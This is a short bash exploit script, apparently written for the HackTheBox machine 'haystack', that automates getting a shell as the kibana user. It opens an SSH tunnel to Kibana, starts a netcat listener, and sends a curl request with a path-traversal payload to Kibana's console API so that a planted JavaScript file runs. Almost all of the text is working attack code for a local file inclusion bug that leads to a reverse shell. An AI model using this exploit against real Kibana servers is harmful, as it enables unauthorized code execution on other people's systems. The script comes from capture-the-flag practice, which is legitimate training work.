#!/bin/bash
# this scripts will automate the process for getting kibana user shell
# Creating SSH Tunnel, NetCat listener, Curl get request to the remote JS file to get shell :)

#This script must be run in tmux session

echo "[+] Starting"
echo "[+] Creating SSH Tunnel"

tmux split-window 'ssh -L 1337:127.0.0.1:5601 security@haystack.htb'
sleep 3

read -p "[!] Enter Port Number To Run NetCat Listener: " port
tmux split-window "nc -nvlp $port"

read -p "[*] Enter The Name of JS File: " name
sleep 1

tmux split-window "curl http://127.0.0.1:1337/api/console/api_server\?apis\=../../../../../../../../../../../tmp/$name.js"
echo "Done"
